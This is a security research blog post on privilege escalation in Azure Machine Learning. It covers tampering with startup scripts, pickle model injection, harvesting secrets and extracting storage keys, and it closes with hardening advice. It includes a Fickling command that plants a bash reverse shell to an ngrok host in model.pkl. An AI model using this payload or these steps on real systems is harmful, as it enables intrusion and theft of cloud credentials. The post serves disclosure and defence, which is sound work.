---
title: "Privilege Escalation in Azure Machine Learning"
date: 2025-03-10 01:00:00 +0300
tags:
  - Azure,Azure Machine Learning,Storage Account,Privilege Escalation,Machine Learning
categories:
  - Azure
---

A few months ago, when browsing through the Azure services list, I stumbled upon Azure Machine Learning. The sheer number of capabilities and complexity of the service got me curious, so I decided it would be interesting to test it for misconfigurations and vulnerabilities. After some trial and error, my research uncovered intriguing findings. In this blog post, I’ll introduce a new privilege escalation technique that can occur in Azure Machine Learning. These findings were also presented at the BSides Zagreb 2025 conference.

## Introduction

Azure Machine Learning is a cloud-based platform designed to accelerate and manage the entire machine learning lifecycle. Once a task is defined, Azure ML enables users to:
- Explore and prepare datasets
- Develop, train, and validate machine learning models
- Deploy models seamlessly
- Monitor and manage models and datasets using MLOps practices

Azure ML provides a handy collection of tools for users of varying capabilities. Notebooks provide a way for advanced users to write custom code, which provides flexibility. The Designer simplifies the process of constructing models through a drag-and-drop interface, meaning that coding is unnecessary. Automated Machine Learning (AutoML) accelerates the process by automating the selection, training, and tuning of models. Azure Machine Learning combines these tools to enhance workflows and simplify machine learning lifecycle. But as with many aspects of security, the complexity of technology can introduce potential vulnerabilities. Azure Machine Learning is not immune to misconfigurations and security risks. In this article, I will explore potential privilege escalation paths that could allow an attacker with limited permissions to compromise Azure Machine Learning. Additionally, I will examine how, after gaining access, the attacker could pivot to other systems and targets within the company's environment.


## Let's Go Back to the Basics

To start working with Azure ML, we must first create a workspace. This is accomplished by creating an Azure ML resource in the Azure Portal. Once this resource is created, we can launch the Azure Machine Learning Studio from the portal to manage your machine learning projects.

![azml_01]({{site.baseurl}}/assets/images/AZML/workspace_creation.png){:style="display:block; margin-left:auto; margin-right:auto"}

Each time a new workspace is created, several resources are automatically set up in the assigned resource group, including: Key Vault, Storage Account,Azure Container Registry (optional) and Application Insights.

![azml_02]({{site.baseurl}}/assets/images/AZML/azml_resources.png){:style="display:block; margin-left:auto; margin-right:auto"}

In addition to these resources, Microsoft provides various built-in roles to manage access and permissions within Azure Machine Learning workspaces.  

- **AzureML Data Scientist** role allows users to perform all actions within the workspace, except for creating or deleting compute resources and modifying the workspace itself.  
- **Compute Operator** role grants the ability to create, manage, delete, and access compute resources within the workspace.  
- **Reader** role provides read-only access to view assets and datastore credentials but does not allow the creation or modification of resources.  
- **Contributor** role enables users to view, create, edit, and delete assets. This includes creating experiments, attaching compute clusters, submitting runs, and deploying web services.  
- **Owner** role offers full access, including the ability to view, create, edit, and delete assets, as well as manage role assignments.

These roles have a fundamental role in permission management and in helping individuals collaborate safely within the workspace. An AzureML Data Scientist user can access the workspace, use the notebook, and use a compute instance to run scripts and train models.

### Compute Instance

The user can select from various compute targets:

•	Compute Cluster  
•	Kubernetes Clusters  
•	Attached Compute  
•	Compute Instance  

The image above illustrates an example of what a user can observe while utilizing a notebook on a compute instance created within the workspace.

![azml_03]({{site.baseurl}}/assets/images/AZML/notebook.png){:style="display:block; margin-left:auto; margin-right:auto"}

Data scientists can run code in notebooks using different compute resources. One notable feature of Azure Machine Learning is the ability to assign each user a dedicated compute instance, ensuring that only they can access their machine. However, all files stored in the notebook section of the cloud are shared among users. This happens because all compute instances mount the same file share, allowing files to be accessible across multiple machines. When accessing a compute instance through Azure Machine Learning Studio or via SSH, two key directories are visible. The **cloudfiles** directory contains shared files available across all compute instances, while the **localfiles** directory holds files that are only accessible on the specific instance being used.

![azml_04]({{site.baseurl}}/assets/images/AZML/compute_instance_file_share.png){:style="display:block; margin-left:auto; margin-right:auto"}

**So, where exactly is this shared storage located?**

All files within the workspace, including notebooks, scripts, models, and snapshot logs, are stored in the Storage Account created during the workspace setup. This storage account features a file share that contains all scripts from the notebook page shared between compute instances, as well as blob storage that holds snapshot logs and models.

![azml_05]({{site.baseurl}}/assets/images/AZML/storage_account.png){:style="display:block; margin-left:auto; margin-right:auto"}

In the file sharing, you can locate the Users directory, which contains all the files that can be access from the notebook page. 

![azml_06]({{site.baseurl}}/assets/images/AZML/explore_storage.png){:style="display:block; margin-left:auto; margin-right:auto"}

![azml_07]({{site.baseurl}}/assets/images/AZML/file_share_mount.png){:style="display:block; margin-left:auto; margin-right:auto"}

It's important to point out that File Share relies solely on credential-based authentication.

![azml_08]({{site.baseurl}}/assets/images/AZML/storage_credentials.png){:style="display:block; margin-left:auto; margin-right:auto"}

## Privilege Escalation and Lateral Movement

Azure Machine Learning, like other Azure services, presents several potential privilege escalation pathways that attackers could exploit if they possess specific permissions. These vulnerabilities could result in the compromise of Azure Machine Learning itself or facilitate lateral movement to other Azure services, enabling further privilege escalation.

### Abusing Azure Storage Account Keys

#### The Startup Script Method

An attacker can escalate privileges by gaining control over the storage within the Azure Machine Learning workspace. With access to the storage account, the attacker can manipulate, edit, delete, and create files within the file share where scripts and notebooks are stored. If an attacker compromises a user with sufficient permissions, they can exploit the `Microsoft.Storage/storageAccounts/listKeys/action` permission. This permission allows the retrieval of access keys for storage accounts. As the name implies, the `listKeys` permission grants the ability to list the access keys. Since the storage account typically uses Shared Key authorization by default, obtaining the access keys grants the attacker unrestricted access to all data within the account.

The most straightforward way to escalate privileges with this method and gain access to Azure Machine Learning compute instances is by modifying the startup script. In Azure ML administrators can create custom setup scripts to configure compute instances in the workspace. By modifying the startup script, an attacker can inject malicious code to establish persistent access, exfiltrate data, or move laterally within the Azure environment. Administrators often configure these scripts to automate the customization and setup of compute instances during provisioning. The startup script executes each time the compute instance starts, with its working directory set to the location where the script was uploaded. For example, if the script is uploaded to `Users/admin`, its execution path on the compute instance would be `/home/azureuser/cloudfiles/code/Users/admin`. This setup enables the use of relative paths within the script. However, an attacker with access to the storage account or its access keys could overwrite this Bash script. This would potentially compromise all Azure Machine Learning compute instances where the script is configured to run. Because these scripts are stored in the cloud, they are typically designed to configure multiple machines across Azure ML, including installing libraries, defining environment settings, and applying specific configurations, making them an attractive target for exploitation.


![azml_09]({{site.baseurl}}/assets/images/AZML/privilege_escalation_startup.png){:style="display:block; margin-left:auto; margin-right:auto"}

To exploit this, let’s assume an attacker has compromised a user with sufficient permissions to access the storage account, such as a Storage Account Contributor. In this scenario, the attacker has gained control of the user Ely and can locate the startup script within the File Share, replacing it with a malicious Bash script that includes a reverse shell. By substituting the original script, the attacker ensures that the malicious code executes automatically each time the compute instance starts, granting persistent access and enabling remote control over the instance. This approach effectively compromises the environment, allowing the attacker to escalate privileges, exfiltrate data, or pivot to other resources within the Azure infrastructure.

![azml_10]({{site.baseurl}}/assets/images/AZML/ely_startup_script.png){:style="display:block; margin-left:auto; margin-right:auto"}

The attacker can locate a file named startup.sh, delete it, and replace it with a malicious file of the same name containing a reverse shell. When a compute instance is started or restarted, the attacker can gain a reverse shell on the machine. In this scenario, ngrok is used to expose a listener and establish the reverse shell connection. The attacker can then obtain a Managed Identity access token and leverage it to pivot to other systems.

![azml_11]({{site.baseurl}}/assets/images/AZML/shell_startup.png){:style="display:block; margin-left:auto; margin-right:auto"}

#### Pickle File Injection: From Storage Account to Azure Container

A similar attack scenario can be executed using a .pkl file. In this case, if user files are stored in the File Share, jobs and experiments are stored in Blob Storage. As before, we assume an attacker has compromised the user Ely, who does not have access to Azure Machine Learning but holds the Storage Account Contributor role. The attacker can identify the model stored in the blob, download it, inject malicious Python code into the model, and re-upload the malicios model back into the storage account. This poses a significant risk because .pkl files are typically neither inspected nor easily readable, they contain pre-trained models. These compromised models can be deployed across various systems, including Flask applications, Azure Virtual Machines, Azure Machine Learning endpoints, Azure App Service, Azure Containers, or even external systems outside the cloud. Moreover, such models are frequently distributed internally within organizations, shared with clients, or exposed in public repositories like GitHub, enabling attackers to spread malicious code across the organization. In our demonstration, we injected malicious code into a model.pkl file using a tool called Fickling. As an example, the compromised model was deployed in an Azure Container via Azure Machine Learning. 

As the first step, we identify the model.pkl file within the blob storage that we intend to inject with malicious code.

![azml_12]({{site.baseurl}}/assets/images/AZML/storage_pkl.png){:style="display:block; margin-left:auto; margin-right:auto"}

After identifying the file, we download it and inject a reverse shell code with [Fickling]("https://github.com/trailofbits/fickling"). We can then overwrite the original model.pkl file in the blob with the compromised version containing the injected code. Once re-uploaded, the malicious code will execute whenever the model is deployed.

```bash
fickling --inject '__import__("subprocess").run(["bash", "-c", "bash -i >&/dev/tcp/0.tcp.eu.ngrock.io/122274 0>&1"])' model_original.pkl > model.pkl
```

In this scenario, we assume data scientists decide to deploy the model to an Azure Container.

![azml_13]({{site.baseurl}}/assets/images/AZML/container.png){:style="display:block; margin-left:auto; margin-right:auto"}

The attacker can then proceed to obtain the access token and use it to move laterally to other systems.

![azml_14]({{site.baseurl}}/assets/images/AZML/shell_container.png){:style="display:block; margin-left:auto; margin-right:auto"}

### Harvesting Credentials

Having gained access to an Azure Machine Learning (Azure ML) workspace, the million-dollar question is: what comes next? In this chapter, I will demonstrate how an attacker who has compromised a vulnerable Azure ML user account can move laterally to other systems by extracting stored credentials. Users with the Azure ML Data Scientist role can retrieve credentials from secrets stored within Azure Machine Learning. These secrets—such as API keys and authentication tokens—are primarily stored in Workspace Connections. This setup introduces a significant security risk: if an attacker gains control of a user with access to Azure ML, they can leverage these credentials to infiltrate other systems, escalate privileges, and exfiltrate sensitive data. A crucial detail overlooked is that credentials cannot be directly read from Azure Machine Learning Studio, they must be accessed via the API. This limitation can create a false sense of security for system administrators, who may assume that credentials stored in the workspace are protected. However, any user with the necessary permissions can still extract them through the API. Even more concerning, these credentials often provide access to external services such as S3 buckets, OpenAI connections, external AWS endpoints, and more. For an attacker, this is a goldmine, offering an easy path to further privilege escalation and lateral movement.  

![azml_15]({{site.baseurl}}/assets/images/AZML/connection_01.png){:style="display:block; margin-left:auto; margin-right:auto"}

![azml_16]({{site.baseurl}}/assets/images/AZML/connection_02.png){:style="display:block; margin-left:auto; margin-right:auto"}


### Unlocking Storage Keys and Managed Identity

Before I finalize this post, there’s another aspect of Azure ML I'd like to discuss. This issue was highlighted in the talk [Breaking ML Services: Finding 0-Days in Azure Machine Learning]("https://youtu.be/-K08hpzevYY?si=t0_nqWzVhgrYy88h"), presented by Nitesh Surana during HITB SECCONF in 2023. If we find ourselves in a situation where the attacker successfully compromises a compute instance. <u>It's important to know that users with access to compute instances can also access the storage account keys</u>. To demonstrate this, let's see how users in Azure ML share files between compute instances. It happens through an agent process named `dismountagent`, which checks and mounts the file share on the compute instance every 102 seconds.

![azml_17]({{site.baseurl}}/assets/images/AZML/dsimountagent.png){:style="display:block; margin-left:auto; margin-right:auto"}

To authenticate to the file share, the agent uses a certificate and a private key, which are stored under `/mnt/batch/task/startup/certs/`. This setup allows the compute instances to access the storage account and share files, making it a potential attack vector for those who gain access to the compute instance.

![azml_18]({{site.baseurl}}/assets/images/AZML/pfx_compute.png){:style="display:block; margin-left:auto; margin-right:auto"}

Once the certificate is exported, we can generate a .pfx file. After that, we can load it into the Burp TLS client certificate. 

![azml_19]({{site.baseurl}}/assets/images/AZML/burpsuite.png){:style="display:block; margin-left:auto; margin-right:auto"}

This enables us to make requests to the backend and retrieve the AccountKeyJWE, potentially gaining access to sensitive information, such as the storage account keys. We have several methods at our disposal: getworkspace, getworkspacesecrets, and getaadtoken. These methods can be used to retrieve the following:

- **getworkspace**: Information about the workspace.
- **getworkspacesecrets**: The AccountKeyJWE.
- **getaadtoken**: The Managed Identity of the compute instance.

![azml_20]({{site.baseurl}}/assets/images/AZML/burp_01.png){:style="display:block; margin-left:auto; margin-right:auto"}

![azml_21]({{site.baseurl}}/assets/images/AZML/burp_02.png){:style="display:block; margin-left:auto; margin-right:auto"}

![azml_22]({{site.baseurl}}/assets/images/AZML/burp_03.png){:style="display:block; margin-left:auto; margin-right:auto"}

Let’s focus on getworkspacesecrets, which allows us to obtain the AccountKeyJWE. To decrypt the AccountKeyJWE, two additional values are required: 

- AZ_LS_ENCRYPTED_SYMMETRIC_KEY
- AZ_BATCHAI_CLUSTER_PRIVATE_KEY_PEM

These values can be found in the file `/mnt/batch/tasks/startup/wd/dsi/dsimountenv`.

![azml_23]({{site.baseurl}}/assets/images/AZML/keys.png){:style="display:block; margin-left:auto; margin-right:auto"}

When we export this key, we can use the first key to decrypt the second one. Once decrypted, this key can then be used to decrypt the JWE and retrieve the storage account key.

![azml_24]({{site.baseurl}}/assets/images/AZML/key_decryption.png){:style="display:block; margin-left:auto; margin-right:auto"}

It is now possible to retrieve the storage account access keys used by Azure Machine Learning, allowing us to access the File Share.

![azml_25]({{site.baseurl}}/assets/images/AZML/access_key_01.png){:style="display:block; margin-left:auto; margin-right:auto"}

![azml_26]({{site.baseurl}}/assets/images/AZML/access_key_02.png){:style="display:block; margin-left:auto; margin-right:auto"}

A few weeks before this article, it seems that Microsoft decided to "fix" this issue by removing the encryption key from the environment files. It’s unclear whether this change will fully prevent the retrieval of a storage account access key after the compromise of a compute instance. However, since the file share still needs to be mounted on the compute instances, these instances must retrieve the access key in some way.

### Boosting Security for Azure Machine Learning


The privilege escalation techniques discussed in this bog post exploit built-in functionalities that attackers could misuse to gain elevated permissions within Azure Machine Learning. Additionally, attackers may leverage these techniques to move laterally, using Azure Machine Learning as a pivot point to escalate privileges in other Azure services. To mitigate these risks, organizations can adopt best practices to optimize security in Azure Machine Learning. A simple yet effective measure is to enforce network isolation when creating new workspaces. 

![azml_27]({{site.baseurl}}/assets/images/AZML/boost_security.png){:style="display:block; margin-left:auto; margin-right:auto"}

Microsoft provides detailed guidance in their documentation on securing Azure Machine Learning environments. Key recommendations include:
- Secure the Workspace: Create a private endpoint for the Azure Machine Learning workspace, connecting it to a VNet via private IP addresses. Public access should only be enabled if absolutely necessary.
- Secure Associated Resources: Use service endpoints or private endpoints to securely connect to resources such as Azure Storage and Azure Key Vault. Service endpoints authenticate the VNet’s identity, while private endpoints assign private IP addresses, effectively integrating these services into the VNet.

In addition, it is crucial to:
- Monitor Cloud Environments for any changes or anomalies.
- Enable Comprehensive Logging to track activities and detect suspicious behavior.
- Rotate Storage Account Access Keys regularly to reduce the risk of unauthorized access.
- Control Data Access Permissions to ensure only authorized clients can access sensitive information.
- Review Jupyter Notebooks Periodically to identify and address potential vulnerabilities.
- Enforce the Principle of Least Privilege by granting users and services only the permissions they need to perform their tasks.

These practices further enhance the security and resilience of your Azure Machine Learning environment.
